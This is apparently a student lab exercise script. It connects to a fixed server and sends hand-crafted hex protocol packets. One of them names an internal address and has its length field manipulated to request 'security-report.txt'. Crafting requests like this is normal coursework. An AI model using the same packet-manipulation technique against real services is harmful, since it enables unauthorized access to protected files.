"""
exercise 3.2.1
@Authors: Noah Link, Jan Pfeifer, Julian Weske
"""

import socket

if __name__ == "__main__":
    HOST = "195.37.209.19"
    PORT = 7213

    # Create a socket object
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        # Connect to the server
        client_socket.connect((HOST, PORT))
        print("\n##########################\n")
        print("Connection established with server.")

        # Send data request to the server
        data_request_hex = "010a00013d07e50004770473840100012e"
        #                   010a00000407e50004773c73840100012e
        client_socket.sendall(bytes.fromhex(data_request_hex))
        print("Data request sent: ", bytes.fromhex(data_request_hex))
        response = client_socket.recv(4096)
        print("Data response from server:", response)
        print("\n##########################\n")

        # Construct the file request packet
        """
            Request for marketing.txt
            "01 0a00013d 07e50019770473990100 16 6d61726b6574696e672d73747261746567792e747874"
            
            - 01: Nachricht von Client (02 ist von Server)
            - 0a00013d: 10.0.1.61 ist eine IP Adresse
            - 07e50019770473990100: Inneres Packet
            - 16: Länge der Payload in Hex
            - 6d61726b6574696e672d73747261746567792e747874: payload (44 Zeichen, 22 Bit, 22 in Hex ist 16)
        """
        file_request_hex = (
            "01 0a00013d 07e50019 7704739901 0013 73656375726974792d7265706f72742e747874000000"  # Change 0016 to 0013 and pad with 000000s
        ).replace(" ", "")
        client_socket.sendall(bytes.fromhex(file_request_hex))
        print("File request sent: \n\n", bytes.fromhex(file_request_hex))
        response = client_socket.recv(4096)

        # Replace Unicode box drawing characters with ASCII equivalents
        try:
            response = response.decode("utf-8")
        except UnicodeDecodeError:
            response = response.decode("utf-8", errors="ignore")
        response = response.replace("┌", "+").replace("┬", "+").replace("┐", "+")
        response = response.replace("├", "+").replace("┼", "+").replace("┤", "+")
        response = response.replace("└", "+").replace("┴", "+").replace("┘", "+")
        response = response.replace("│", "|").replace("─", "-")

        print("File response from server:", response)
        print("\n##########################\n")
